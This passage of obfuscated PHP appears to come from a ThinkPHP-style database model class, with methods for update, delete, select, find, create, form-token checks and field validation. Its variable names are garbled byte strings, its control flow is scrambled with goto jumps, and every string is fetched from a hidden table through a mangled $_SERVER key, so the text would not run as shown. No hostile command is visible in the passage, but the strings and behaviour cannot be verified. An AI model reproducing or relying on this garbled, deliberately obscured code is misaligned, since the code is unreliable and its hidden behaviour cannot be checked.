Fƒ¹ó”Äˆ: $eªÛ™†êâƒ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($f¹ÄÀè¶ëï)) { if (!empty($this->data)) { $f¹ÄÀè¶ëï = $this->data; $this->data = array(); } else { $this->error = think_lang($eªÛ™†êâƒ[259]); return !1; } } $f¹ÄÀè¶ëï = $this->_facade($f¹ÄÀè¶ëï); goto d£¬¹ùƒáõ; dóÜ›ãĞšô: if (is_array($Eß…àÒŒ„è[$eªÛ™†êâƒ[263]]) && isset($Eß…àÒŒ„è[$eªÛ™†êâƒ[263]][$bø‘ò™ª])) { $c¨í…¥æ…Ì = $Eß…àÒŒ„è[$eªÛ™†êâƒ[263]][$bø‘ò™ª]; } if (!1 === $this->_beforeUpdate($f¹ÄÀè¶ëï, $Eß…àÒŒ„è)) { return !1; } $A¥¢¶®‡õ = $this->db->update($f¹ÄÀè¶ëï, $Eß…àÒŒ„è); goto AÄÑ‡ñÖÓ·; AÄÑ‡ñÖÓ·: if (!1 !== $A¥¢¶®‡õ) { if (isset($c¨í…¥æ…Ì)) { $f¹ÄÀè¶ëï[$bø‘ò™ª] = $c¨í…¥æ…Ì; } $this->_afterUpdate($f¹ÄÀè¶ëï, $Eß…àÒŒ„è); } return $A¥¢¶®‡õ; goto a–Á‡¼…¥¦; a–Á‡¼…¥¦: } protected function _beforeUpdate(&$d¦–Š¬Ö¥‹, $F†õÛêÏ—õ) { } protected function _afterUpdate($BøÌìØ¸ªÖ, $CÄª¼É–ê) { } public function delete($c‡ç©³ë”Ç = array()) { goto A¶‡ºâëÅÜ; b¤ò ÎÏ¥ˆ: $E‰Áß…¶ø¯ = $this->db->delete($c‡ç©³ë”Ç); if (!1 !== $E‰Áß…¶ø¯) { $AóĞ«Åèê® = array(); if (isset($e…Ã²æÜÊÏ)) { $AóĞ«Åèê®[$aì¾†ÆØ¯«] = $e…Ã²æÜÊÏ; } $this->_after_delete($AóĞ«Åèê®, $c‡ç©³ë”Ç); } return $E‰Áß…¶ø¯; goto BÒ•èÛà°; B—Ñ°Ó÷à¬: if (is_numeric($c‡ç©³ë”Ç) || is_string($c‡ç©³ë”Ç)) { if (strpos($c‡ç©³ë”Ç, $eæ‡Àâæ­½[47])) { $cñÕæÁµ¯„[$aì¾†ÆØ¯«] = array($eæ‡Àâæ­½[264], $c‡ç©³ë”Ç); } else { $cñÕæÁµ¯„[$aì¾†ÆØ¯«] = $c‡ç©³ë”Ç; } $this->options[$eæ‡Àâæ­½[263]] = $cñÕæÁµ¯„; } $c‡ç©³ë”Ç = $this->_parseOptions(); if (is_array($c‡ç©³ë”Ç[$eæ‡Àâæ­½[263]]) && isset($c‡ç©³ë”Ç[$eæ‡Àâæ­½[263]][$aì¾†ÆØ¯«])) { $e…Ã²æÜÊÏ = $c‡ç©³ë”Ç[$eæ‡Àâæ­½[263]][$aì¾†ÆØ¯«]; } goto b¤ò ÎÏ¥ˆ; A¶‡ºâëÅÜ: $eæ‡Àâæ­½ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($c‡ç©³ë”Ç) && empty($this->options[$eæ‡Àâæ­½[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aì¾†ÆØ¯« = $this->getPk(); goto B—Ñ°Ó÷à¬; BÒ•èÛà°: } protected function _after_delete($EŒæˆÖ‹Â, $båÆ²Í†) { } public function select($BÔÈ‚šÑíê = array()) { goto eŸˆš•é»; eŸˆš•é»: $AÓì¹Ÿ©Óİ =& $_SERVER[”Ì÷ñ­î¸]; if (is_string($BÔÈ‚šÑíê) || is_numeric($BÔÈ‚šÑíê)) { $FÚ“ Êê’  = $this->getPk(); if (strpos($BÔÈ‚šÑíê, $AÓì¹Ÿ©Óİ[47])) { $eá­ªÙğç‘[$FÚ“ Êê’ ] = array($AÓì¹Ÿ©Óİ[264], $BÔÈ‚šÑíê); } else { $eá­ªÙğç‘[$FÚ“ Êê’ ] = $BÔÈ‚šÑíê; } $this->options[$AÓì¹Ÿ©Óİ[263]] = $eá­ªÙğç‘; } elseif (!1 === $BÔÈ‚šÑíê) { $BÔÈ‚šÑíê = $this->_parseOptions(); return $AÓì¹Ÿ©Óİ[265] . $this->db->buildSelectSql($BÔÈ‚šÑíê) . $AÓì¹Ÿ©Óİ[266]; } $BÔÈ‚šÑíê = $this->_parseOptions(); goto eæ¿…“Á¢; A™¬ø›÷: $this->_afterSelect($d¹¹£”Î«†, $BÔÈ‚šÑíê); return $d¹¹£”Î«†; goto D¥º¸šñÏÈ; eæ¿…“Á¢: $d¹¹£”Î«† = $this->db->select($BÔÈ‚šÑíê); if (!1 === $d¹¹£”Î«†) { return !1; } if (empty($d¹¹£”Î«†)) { return null; } goto A™¬ø›÷; D¥º¸šñÏÈ: } protected function _afterSelect(&$d“±àˆ½£, $BªÒÇ¶àÖß) { } public function buildSql($B—Æİ»™¼¯ = array()) { $E×‰•ÙÍ‚õ =& $_SERVER[”Ì÷ñ­î¸]; $B—Æİ»™¼¯ = $this->_parseOptions($B—Æİ»™¼¯); return $E×‰•ÙÍ‚õ[265] . $this->db->buildSelectSql($B—Æİ»™¼¯) . $E×‰•ÙÍ‚õ[266]; } public function optionsValue($e•§Ñ¾È÷µ = null) { if (is_null($e•§Ñ¾È÷µ)) { return $this->options; } elseif (is_array($e•§Ñ¾È÷µ)) { $this->options = array_merge($this->options, $e•§Ñ¾È÷µ); } } protected function _parseOptions($EøÎõ½ÅÉƒ = array()) { goto f¤æ†Ñ•ƒÂ; d«èè”÷º: if (!isset($EøÎõ½ÅÉƒ[$B’èØ²ò­[267]])) { $EøÎõ½ÅÉƒ[$B’èØ²ò­[267]] = $this->getTableName(); $FˆÒ³êÍ†Õ = $this->fields; } else { $FˆÒ³êÍ†Õ = $this->getDbFields(); } if (!empty($EøÎõ½ÅÉƒ[$B’èØ²ò­[268]])) { $EøÎõ½ÅÉƒ[$B’èØ²ò­[267]] .= $B’èØ²ò­[50] . $EøÎõ½ÅÉƒ[$B’èØ²ò­[268]]; } $EøÎõ½ÅÉƒ[$B’èØ²ò­[269]] = $this->name; goto f´Šã¾ÌÊÏ; f´Šã¾ÌÊÏ: if (isset($EøÎõ½ÅÉƒ[$B’èØ²ò­[263]]) && is_array($EøÎõ½ÅÉƒ[$B’èØ²ò­[263]]) && !empty($FˆÒ³êÍ†Õ) && !isset($EøÎõ½ÅÉƒ[$B’èØ²ò­[270]]) && !isset($EøÎõ½ÅÉƒ[$B’èØ²ò­[267]])) { foreach ($EøÎõ½ÅÉƒ[$B’èØ²ò­[263]] as $E÷‡˜œ¶Á£ => $bÙæƒ®¨ƒÀ) { $E÷‡˜œ¶Á£ = trim($E÷‡˜œ¶Á£); if (in_array($E÷‡˜œ¶Á£, $FˆÒ³êÍ†Õ, !0)) { if (is_scalar($bÙæƒ®¨ƒÀ)) { $this->_parseType($EøÎõ½ÅÉƒ[$B’èØ²ò­[263]], $E÷‡˜œ¶Á£); } } elseif (!is_numeric($E÷‡˜œ¶Á£) && $B’èØ²ò­[70] != substr($E÷‡˜œ¶Á£, 0, 1) && !1 === strpos($E÷‡˜œ¶Á£, $B’èØ²ò­[91]) && !1 === strpos($E÷‡˜œ¶Á£, $B’èØ²ò­[248]) && !1 === strpos($E÷‡˜œ¶Á£, $B’èØ²ò­[271]) && !1 === strpos($E÷‡˜œ¶Á£, $B’èØ²ò­[272])) { unset($EøÎõ½ÅÉƒ[$B’èØ²ò­[263]][$E÷‡˜œ¶Á£]); } } } $this->_options_filter($EøÎõ½ÅÉƒ); return $EøÎõ½ÅÉƒ; goto D½°´Ş…›æ; f¤æ†Ñ•ƒÂ: $B’èØ²ò­ =& $_SERVER[”Ì÷ñ­î¸]; if (is_array($EøÎõ½ÅÉƒ)) { $EøÎõ½ÅÉƒ = array_merge($this->options, $EøÎõ½ÅÉƒ); } $this->options = array(); goto d«èè”÷º; D½°´Ş…›æ: } protected function _options_filter(&$cø‹ò²œˆõ) { } protected function _parseType(&$c¬ò‰¶’ï, $C×°ÛÚìƒ¾) { $B·ÃÆÆµ„ò =& $_SERVER[”Ì÷ñ­î¸]; if (empty($this->options[$B·ÃÆÆµ„ò[273]][$B·ÃÆÆµ„ò[4] . $C×°ÛÚìƒ¾])) { $Cš÷Ÿº¨®Æ = strtolower($this->fields[$B·ÃÆÆµ„ò[240]][$C×°ÛÚìƒ¾]); if (!1 !== strpos($Cš÷Ÿº¨®Æ, $B·ÃÆÆµ„ò[274])) { } elseif (!1 === strpos($Cš÷Ÿº¨®Æ, $B·ÃÆÆµ„ò[275]) && !1 !== strpos($Cš÷Ÿº¨®Æ, $B·ÃÆÆµ„ò[276])) { $c¬ò‰¶’ï[$C×°ÛÚìƒ¾] = intval($c¬ò‰¶’ï[$C×°ÛÚìƒ¾]); } elseif (!1 !== strpos($Cš÷Ÿº¨®Æ, $B·ÃÆÆµ„ò[277]) || !1 !== strpos($Cš÷Ÿº¨®Æ, $B·ÃÆÆµ„ò[278])) { $c¬ò‰¶’ï[$C×°ÛÚìƒ¾] = floatval($c¬ò‰¶’ï[$C×°ÛÚìƒ¾]); } elseif (!1 !== strpos($Cš÷Ÿº¨®Æ, $B·ÃÆÆµ„ò[279])) { $c¬ò‰¶’ï[$C×°ÛÚìƒ¾] = (bool) $c¬ò‰¶’ï[$C×°ÛÚìƒ¾]; } } } public function find($CÑÎ´“İä² = array()) { goto a“Ëå‘‰ôİ; dÉñõ×ƒ¿Ï: if (empty($cÄàÍš…ğ³)) { return null; } $this->data = $cÄàÍš…ğ³[0]; $this->_afterFind($this->data, $CÑÎ´“İä²); goto EÜ ˆÚË§; a“Ëå‘‰ôİ: $E¨áÊœ…¨¿ =& $_SERVER[”Ì÷ñ­î¸]; if (is_numeric($CÑÎ´“İä²) || is_string($CÑÎ´“İä²)) { $E´¢¢¦—í‹[$this->getPk()] = intval($CÑÎ´“İä²); $this->options[$E¨áÊœ…¨¿[263]] = $E´¢¢¦—í‹; } $this->options[$E¨áÊœ…¨¿[280]] = 1; goto B’‡¦®ƒ¼„; B’‡¦®ƒ¼„: $CÑÎ´“İä² = $this->_parseOptions(); $cÄàÍš…ğ³ = $this->db->select($CÑÎ´“İä²); if (!1 === $cÄàÍš…ğ³) { return !1; } goto dÉñõ×ƒ¿Ï; EÜ ˆÚË§: if (!empty($this->options[$E¨áÊœ…¨¿[281]])) { return $this->returnResult($this->data, $this->options[$E¨áÊœ…¨¿[281]]); } return $this->data; goto F‹‹‡—”¡; F‹‹‡—”¡: } protected function _afterFind(&$CÕÓ‹íÆªÇ, $E†ª©èÅ›†) { } protected function returnResult($bÏê•ìãè÷, $b×²­ ²™ê = '') { $b‹¹•œ—ì« =& $_SERVER[”Ì÷ñ­î¸]; if ($b×²­ ²™ê) { if (is_callable($b×²­ ²™ê)) { return call_user_func($b×²­ ²™ê, $bÏê•ìãè÷); } switch (strtolower($b×²­ ²™ê)) { case $b‹¹•œ—ì«[282]: return json_encode($bÏê•ìãè÷); case $b‹¹•œ—ì«[283]: return xml_encode($bÏê•ìãè÷); } } return $bÏê•ìãè÷; } public function parseFieldsMap($AÖ„’ó±¨¹, $C¦Û‹İóÈ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $F¦Ï‘¬ÏÉ => $bïñí¢†õÜ) { if ($C¦Û‹İóÈ == 1) { if (isset($AÖ„’ó±¨¹[$bïñí¢†õÜ])) { $AÖ„’ó±¨¹[$F¦Ï‘¬ÏÉ] = $AÖ„’ó±¨¹[$bïñí¢†õÜ]; unset($AÖ„’ó±¨¹[$bïñí¢†õÜ]); } } else { if (isset($AÖ„’ó±¨¹[$F¦Ï‘¬ÏÉ])) { $AÖ„’ó±¨¹[$bïñí¢†õÜ] = $AÖ„’ó±¨¹[$F¦Ï‘¬ÏÉ]; unset($AÖ„’ó±¨¹[$F¦Ï‘¬ÏÉ]); } } } } return $AÖ„’ó±¨¹; } public function setField($A÷ƒ•¥éæÙ, $eŸ¢ØéŞ“ = '') { if (is_array($A÷ƒ•¥éæÙ)) { $DéÚ†ÓŒˆ’ = $A÷ƒ•¥éæÙ; } else { $DéÚ†ÓŒˆ’[$A÷ƒ•¥éæÙ] = $eŸ¢ØéŞ“; } return $this->save($DéÚ†ÓŒˆ’); } public function setAdd($e†¤“¦‚É, $Aç¨ğÉºù = 1) { $BêØö¸Û‘ =& $_SERVER[”Ì÷ñ­î¸]; $A…İÑÒÏ‘á = $e†¤“¦‚É . $BêØö¸Û‘[284] . $Aç¨ğÉºù; if ($Aç¨ğÉºù < 0) { $A…İÑÒÏ‘á = $e†¤“¦‚É . $Aç¨ğÉºù; } return $this->setField($e†¤“¦‚É, array($BêØö¸Û‘[285], $A…İÑÒÏ‘á)); } public function getField($eùîŒÏÙÔğ, $fÖÕÈğ¯ = null) { $C×®°†Û¯  =& $_SERVER[”Ì÷ñ­î¸]; $aª¾³Ó„¼[$C×®°†Û¯ [261]] = $eùîŒÏÙÔğ; $aª¾³Ó„¼ = $this->_parseOptions($aª¾³Ó„¼); $eùîŒÏÙÔğ = trim($eùîŒÏÙÔğ); if (strpos($eùîŒÏÙÔğ, $C×®°†Û¯ [47])) { if (!isset($aª¾³Ó„¼[$C×®°†Û¯ [280]])) { $aª¾³Ó„¼[$C×®°†Û¯ [280]] = is_numeric($fÖÕÈğ¯) ? $fÖÕÈğ¯ : $C×®°†Û¯ [33]; } $A¼éÇÌÃĞŞ = $this->db->select($aª¾³Ó„¼); if (!empty($A¼éÇÌÃĞŞ)) { goto aÁİš‚Àã; d¤õáÙ°®Ó: $C½ëŠƒ×Š¢ = array_shift($eùîŒÏÙÔğ); $c¼¬»×Íã¬ = array(); $c¹ËŸëÂòâ = count($bÁ¨‚°›ÊÑ); goto BšËŞƒØÜì; BšËŞƒØÜì: foreach ($A¼éÇÌÃĞŞ as $EÁª×ò·ËŒ) { $cµçó™Š¸ = $EÁª×ò·ËŒ[$a‹…©æ¯™ƒ]; if (2 == $c¹ËŸëÂòâ) { $c¼¬»×Íã¬[$cµçó™Š¸] = $EÁª×ò·ËŒ[$C½ëŠƒ×Š¢]; } else { $c¼¬»×Íã¬[$cµçó™Š¸] = is_string($fÖÕÈğ¯) ? implode($fÖÕÈğ¯, $EÁª×ò·ËŒ) : $EÁª×ò·ËŒ; } } return $c¼¬»×Íã¬; goto a»¤…›õÁâ; aÁİš‚Àã: $bÁ¨‚°›ÊÑ = explode($C×®°†Û¯ [47], $eùîŒÏÙÔğ); $eùîŒÏÙÔğ = array_keys($A¼éÇÌÃĞŞ[0]); $a‹…©æ¯™ƒ = array_shift($eùîŒÏÙÔğ); goto d¤õáÙ°®Ó; a»¤…›õÁâ: } } else { if (!0 !== $fÖÕÈğ¯) { $aª¾³Ó„¼[$C×®°†Û¯ [280]] = is_numeric($fÖÕÈğ¯) ? $fÖÕÈğ¯ : 1; } if ($fÖÕÈğ¯ === $C×®°†Û¯ [243]) { unset($aª¾³Ó„¼[$C×®°†Û¯ [280]]); } $EÁª×ò·ËŒ = $this->db->select($aª¾³Ó„¼); if (!empty($EÁª×ò·ËŒ)) { if ($fÖÕÈğ¯ === $C×®°†Û¯ [243]) { return reset($EÁª×ò·ËŒ[0]); } if (!0 !== $fÖÕÈğ¯ && 1 == $aª¾³Ó„¼[$C×®°†Û¯ [280]]) { return reset($EÁª×ò·ËŒ[0]); } foreach ($EÁª×ò·ËŒ as $fÁõÕËùÉ´) { $D‰ËœÀê•ˆ[] = $fÁõÕËùÉ´[$eùîŒÏÙÔğ]; } return $D‰ËœÀê•ˆ; } } return null; } public function create($AÅÕõ®“äÂ = '', $b™·Ëƒ„ÍÒ = '') { goto aªºÎÌ§™¬; C–˜â«™×¬: if ($this->autoCheckFields) { $Aö‡¸ÈâÏ¦ = $this->getDbFields(); foreach ($AÅÕõ®“äÂ as $d“ÏŒ˜ŞÉø => $E™ŒÒ) { if (!in_array($d“ÏŒ˜ŞÉø, $Aö‡¸ÈâÏ¦)) { unset($AÅÕõ®“äÂ[$d“ÏŒ˜ŞÉø]); } elseif (MAGIC_QUOTES_GPC && is_string($E™ŒÒ)) { $AÅÕõ®“äÂ[$d“ÏŒ˜ŞÉø] = stripslashes($E™ŒÒ); } } } $this->autoOperation($AÅÕõ®“äÂ, $b™·Ëƒ„ÍÒ); $this->data = $AÅÕõ®“äÂ; goto e˜˜»™ÇÊâ; DÊÒ¦Ş½õ: $AÅÕõ®“äÂ = $this->parseFieldsMap($AÅÕõ®“äÂ, 0); $b™·Ëƒ„ÍÒ = $b™·Ëƒ„ÍÒ ? $b™·Ëƒ„ÍÒ : (!empty($AÅÕõ®“äÂ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$eÈâ…°¢[261]])) { $Aö‡¸ÈâÏ¦ = $this->options[$eÈâ…°¢[261]]; unset($this->options[$eÈâ…°¢[261]]); } elseif ($b™·Ëƒ„ÍÒ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Aö‡¸ÈâÏ¦ = $this->insertFields; } elseif ($b™·Ëƒ„ÍÒ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Aö‡¸ÈâÏ¦ = $this->updateFields; } goto dÏ¢¨õ„àÏ; aªºÎÌ§™¬: $eÈâ…°¢ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($AÅÕõ®“äÂ)) { $AÅÕõ®“äÂ = $_POST; } elseif (is_object($AÅÕõ®“äÂ)) { $AÅÕõ®“äÂ = get_object_vars($AÅÕõ®“äÂ); } if (empty($AÅÕõ®“äÂ) || !is_array($AÅÕõ®“äÂ)) { $this->error = think_lang($eÈâ…°¢[259]); return !1; } goto DÊÒ¦Ş½õ; e˜˜»™ÇÊâ: return $AÅÕõ®“äÂ; goto a´ª º¿; dÏ¢¨õ„àÏ: if (isset($Aö‡¸ÈâÏ¦)) { if (is_string($Aö‡¸ÈâÏ¦)) { $Aö‡¸ÈâÏ¦ = explode($eÈâ…°¢[47], $Aö‡¸ÈâÏ¦); } if (think_config($eÈâ…°¢[286])) { $Aö‡¸ÈâÏ¦[] = think_config($eÈâ…°¢[287]); } foreach ($AÅÕõ®“äÂ as $d“ÏŒ˜ŞÉø => $E™ŒÒ) { if (!in_array($d“ÏŒ˜ŞÉø, $Aö‡¸ÈâÏ¦)) { unset($AÅÕõ®“äÂ[$d“ÏŒ˜ŞÉø]); } } } if (!$this->autoValidation($AÅÕõ®“äÂ, $b™·Ëƒ„ÍÒ)) { return !1; } if (!$this->autoCheckToken($AÅÕõ®“äÂ)) { $this->error = think_lang($eÈâ…°¢[288]); return !1; } goto C–˜â«™×¬; a´ª º¿: } public function autoCheckToken($eõ”¤—é¯) { $aïÁÅ¤éÕˆ =& $_SERVER[”Ì÷ñ­î¸]; if (isset($this->options[$aïÁÅ¤éÕˆ[289]]) && !$this->options[$aïÁÅ¤éÕˆ[289]]) { return !0; } if (think_config($aïÁÅ¤éÕˆ[286])) { $F†Ô®ëò”¬ = think_config($aïÁÅ¤éÕˆ[287]); if (!isset($eõ”¤—é¯[$F†Ô®ëò”¬]) || Session::get($F†Ô®ëò”¬)) { return !1; } list($díòÀØ±ƒ, $F–—®ÉëœÎ) = explode($aïÁÅ¤éÕˆ[70], $eõ”¤—é¯[$F†Ô®ëò”¬]); if ($F–—®ÉëœÎ && Session::get($F†Ô®ëò”¬ . $aïÁÅ¤éÕˆ[91] . $díòÀØ±ƒ) === $F–—®ÉëœÎ) { Session::remove($F†Ô®ëò”¬ . $aïÁÅ¤éÕˆ[91] . $díòÀØ±ƒ); return !0; } if (think_config($aïÁÅ¤éÕˆ[290])) { Session::remove($F†Ô®ëò”¬ . $aïÁÅ¤éÕˆ[91] . $díòÀØ±ƒ); } return !1; } return !0; } public function regex($EË…Ú÷£Ø™, $a‹ôùğè) { $då¹ŒÃ†¢ =& $_SERVER[”Ì÷ñ­î¸]; $eöö…°Íò÷ = array($då¹ŒÃ†¢[291] => $då¹ŒÃ†¢[292], $då¹ŒÃ†¢[293] => $då¹ŒÃ†¢[294], $då¹ŒÃ†¢[295] => $då¹ŒÃ†¢[296], $då¹ŒÃ†¢[297] => $då¹ŒÃ†¢[298], $då¹ŒÃ†¢[299] => $då¹ŒÃ†¢[300], $då¹ŒÃ†¢[301] => $då¹ŒÃ†¢[302], $då¹ŒÃ†¢[303] => $då¹ŒÃ†¢[304], $då¹ŒÃ†¢[278] => $då¹ŒÃ†¢[305], $då¹ŒÃ†¢[306] => $då¹ŒÃ†¢[307]); if (isset($eöö…°Íò÷[strtolower($a‹ôùğè)])) { $a‹ôùğè = $eöö…°Íò÷[strtolower($a‹ôùğè)]; } return preg_match($a‹ôùğè, $EË…Ú÷£Ø™) === 1; } private function autoOperation(&$a¼î¶æØÜ, $FË‚Ö„™ïÃ) { $e¾ßœÈË© =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($this->options[$e¾ßœÈË©[308]])) { $Bß‰Õª ×½ = $this->options[$e¾ßœÈË©[308]]; unset($this->options[$e¾ßœÈË©[308]]); } elseif (!empty($this->_auto)) { $Bß‰Õª ×½ = $this->_auto; } if (isset($Bß‰Õª ×½)) { foreach ($Bß‰Õª ×½ as $fæ¾…–è©ƒ) { if (empty($fæ¾…–è©ƒ[2])) { $fæ¾…–è©ƒ[2] = THINK_MODEL_INSERT; } if ($FË‚Ö„™ïÃ == $fæ¾…–è©ƒ[2] || $fæ¾…–è©ƒ[2] == THINK_MODEL_BOTH) { switch (trim($fæ¾…–è©ƒ[3])) { case $e¾ßœÈË©[309]: case $e¾ßœÈË©[310]: $b’‚ğíÌ¹ò = isset($fæ¾…–è©ƒ[4]) ? (array) $fæ¾…–è©ƒ[4] : array(); if (isset($a¼î¶æØÜ[$fæ¾…–è©ƒ[0]])) { array_unshift($b’‚ğíÌ¹ò, $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]]); } if ($e¾ßœÈË©[309] == $fæ¾…–è©ƒ[3]) { $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]] = call_user_func_array($fæ¾…–è©ƒ[1], $b’‚ğíÌ¹ò); } else { $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]] = call_user_func_array(array(&$this, $fæ¾…–è©ƒ[1]), $b’‚ğíÌ¹ò); } break; case $e¾ßœÈË©[261]: $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]] = $a¼î¶æØÜ[$fæ¾…–è©ƒ[1]]; break; case $e¾ßœÈË©[311]: if ($e¾ßœÈË©[33] === $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]]) { unset($a¼î¶æØÜ[$fæ¾…–è©ƒ[0]]); } break; case $e¾ßœÈË©[312]: default: $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]] = $fæ¾…–è©ƒ[1]; } if (!1 === $a¼î¶æØÜ[$fæ¾…–è©ƒ[0]]) { unset($a¼î¶æØÜ[$fæ¾…–è©ƒ[0]]); } } } } return $a¼î¶æØÜ; } protected function autoValidation($Aœ‰„Œ˜äÀ, $c‘†“¿ŸŒ´) { $cğÅÊ…—ÅŞ =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($this->options[$cğÅÊ…—ÅŞ[313]])) { $f ©Ø¬ÑªÆ = $this->options[$cğÅÊ…—ÅŞ[313]]; unset($this->options[$cğÅÊ…—ÅŞ[313]]); } elseif (!empty($this->_validate)) { $f ©Ø¬ÑªÆ = $this->_validate; } if (isset($f ©Ø¬ÑªÆ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($f ©Ø¬ÑªÆ as $eõêÁ¿¾‰õ => $Aã­šÑ¦§Ó) { if (empty($Aã­šÑ¦§Ó[5]) || $Aã­šÑ¦§Ó[5] == THINK_MODEL_BOTH || $Aã­šÑ¦§Ó[5] == $c‘†“¿ŸŒ´) { if (0 == strpos($Aã­šÑ¦§Ó[2], $cğÅÊ…—ÅŞ[314]) && strpos($Aã­šÑ¦§Ó[2], $cğÅÊ…—ÅŞ[315])) { $Aã­šÑ¦§Ó[2] = think_lang(substr($Aã­šÑ¦§Ó[2], 2, -1)); } $Aã­šÑ¦§Ó[3] = isset($Aã­šÑ¦§Ó[3]) ? $Aã­šÑ¦§Ó[3] : THINK_EXISTS_VALIDATE; $Aã­šÑ¦§Ó[4] = isset($Aã­šÑ¦§Ó[4]) ? $Aã­šÑ¦§Ó[4] : $cğÅÊ…—ÅŞ[316]; switch ($Aã­šÑ¦§Ó[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Aœ‰„Œ˜äÀ, $Aã­šÑ¦§Ó)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($cğÅÊ…—ÅŞ[33] != trim($Aœ‰„Œ˜äÀ[$Aã­šÑ¦§Ó[0]])) { if (!1 === $this->_validationField($Aœ‰„Œ˜äÀ, $Aã­šÑ¦§Ó)) { return !1; } } break; default: if (isset($Aœ‰„Œ˜äÀ[$Aã­šÑ¦§Ó[0]])) { if (!1 === $this->_validationField($Aœ‰„Œ˜äÀ, $Aã­šÑ¦§Ó)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($f¹´à­ˆ¢ğ, $fÀ×ŒçÇÂ) { if (!1 === $this->_validationFieldItem($f¹´à­ˆ¢ğ, $fÀ×ŒçÇÂ)) { if ($this->patchValidate) { $this->error[$fÀ×ŒçÇÂ[0]] = $fÀ×ŒçÇÂ[2]; } else { $this->error = $fÀ×ŒçÇÂ[2]; return !1; } } return; } protected function _validationFieldItem($d¯ˆâ‘˜Óö, $B§ğ©¥–Å°) { $E±‹×›£­ =& $_SERVER[”Ì÷ñ­î¸]; switch (strtolower(trim($B§ğ©¥–Å°[4]))) { case $E±‹×›£­[309]: case $E±‹×›£­[310]: $EîŠ¯ à×Í = isset($B§ğ©¥–Å°[6]) ? (array) $B§ğ©¥–Å°[6] : array(); if (is_string($B§ğ©¥–Å°[0]) && strpos($B§ğ©¥–Å°[0], $E±‹×›£­[47])) { $B§ğ©¥–Å°[0] = explode($E±‹×›£­[47], $B§ğ©¥–Å°[0]); } if (is_array($B§ğ©¥–Å°[0])) { foreach ($B§ğ©¥–Å°[0] as $Dâ¾êò•Ø) { $f½Í¸Ï‹¦[$Dâ¾êò•Ø] = $d¯ˆâ‘˜Óö[$Dâ¾êò•Ø]; } array_unshift($EîŠ¯ à×Í, $f½Í¸Ï‹¦); } else { array_unshift($EîŠ¯ à×Í, $d¯ˆâ‘˜Óö[$B§ğ©¥–Å°[0]]); } if ($E±‹×›£­[309] == $B§ğ©¥–Å°[4]) { return call_user_func_array($B§ğ©¥–Å°[1], $EîŠ¯ à×Í); } else { return call_user_func_array(array(&$this, $B§ğ©¥–Å°[1]), $EîŠ¯ à×Í); } case $E±‹×›£­[317]: return $d¯ˆâ‘˜Óö[$B§ğ©¥–Å°[0]] == $d¯ˆâ‘˜Óö[$B§ğ©¥–Å°[1]]; case $E±‹×›£­[318]: if (is_string($B§ğ©¥–Å°[0]) && strpos($B§ğ©¥–Å°[0], $E±‹×›£­[47])) { $B§ğ©¥–Å°[0] = explode($E±‹×›£­[47], $B§ğ©¥–Å°[0]); } $fÖä™ÅÚÕ© = array(); if (is_array($B§ğ©¥–Å°[0])) { foreach ($B§ğ©¥–Å°[0] as $Dâ¾êò•Ø) { $fÖä™ÅÚÕ©[$Dâ¾êò•Ø] = $d¯ˆâ‘˜Óö[$Dâ¾êò•Ø]; } } else { $fÖä™ÅÚÕ©[$B§ğ©¥–Å°[0]] = $d¯ˆâ‘˜Óö[$B§ğ©¥–Å°[0]]; } if (!empty($d¯ˆâ‘˜Óö[$this->getPk()])) { $fÖä™ÅÚÕ©[$this->getPk()] = array($E±‹×›£­[319], $d¯ˆâ‘˜Óö[$this->getPk()]); } if ($this->where($fÖä™ÅÚÕ©)->find()) { return !1; } return !0; default: return $this->check($d¯ˆâ‘˜Óö[$B§ğ©¥–Å°[0]], $B§ğ©¥–Å°[1], $B§ğ©¥–Å°[4]); } } public function check($eæõ¶¸›ÎÔ, $eŸÉµœÑÈŠ, $BÅ¼‚–¬Ñè = "\162\145\x67\x65\x78") { $CÛ¶äâÌŸâ =& $_SERVER[”Ì÷ñ­î¸]; $BÅ¼‚–¬Ñè = strtolower(trim($BÅ¼‚–¬Ñè)); switch ($BÅ¼‚–¬Ñè) { case $CÛ¶äâÌŸâ[7]: case $CÛ¶äâÌŸâ[320]: $FĞ‡Š¨ˆÓÏ = is_array($eŸÉµœÑÈŠ) ? $eŸÉµœÑÈŠ : explode($CÛ¶äâÌŸâ[47], $eŸÉµœÑÈŠ); return $BÅ¼‚–¬Ñè == $CÛ¶äâÌŸâ[7] ? in_array($eæõ¶¸›ÎÔ, $FĞ‡Š¨ˆÓÏ) : !in_array($eæõ¶¸›ÎÔ, $FĞ‡Š¨ˆÓÏ); case $CÛ¶äâÌŸâ[321]: case $CÛ¶äâÌŸâ[322]: if (is_array($eŸÉµœÑÈŠ)) { $a¯à²² = $eŸÉµœÑÈŠ[0]; $Bæ“Ûæ„ø = $eŸÉµœÑÈŠ[1]; } else { list($a¯à²², $Bæ“Ûæ„ø) = explode($CÛ¶äâÌŸâ[47], $eŸÉµœÑÈŠ); } return $BÅ¼‚–¬Ñè == $CÛ¶äâÌŸâ[321] ? $eæõ¶¸›ÎÔ >= $a¯à²² && $eæõ¶¸›ÎÔ <= $Bæ“Ûæ„ø : $eæõ¶¸›ÎÔ < $a¯à²² || $eæõ¶¸›ÎÔ > $Bæ“Ûæ„ø; case $CÛ¶äâÌŸâ[323]: case $CÛ¶äâÌŸâ[324]: return $BÅ¼‚–¬Ñè == $CÛ¶äâÌŸâ[323] ? $eæõ¶¸›ÎÔ == $eŸÉµœÑÈŠ : $eæõ¶¸›ÎÔ != 